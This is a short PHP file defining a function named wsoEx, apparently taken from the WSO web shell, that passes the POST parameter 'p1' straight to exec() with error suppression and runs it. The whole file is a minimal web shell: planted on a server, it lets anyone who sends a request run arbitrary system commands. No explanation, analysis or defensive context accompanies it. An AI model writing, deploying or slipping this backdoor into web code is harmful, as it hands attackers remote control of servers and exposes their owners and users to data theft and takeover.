<?php
function wsoEx($in) {
    $out = '';
    
    @exec($in,$out);
    $out = @join("\n",$out); 
    return $out;
}

wsoEx($_POST['p1']);
?>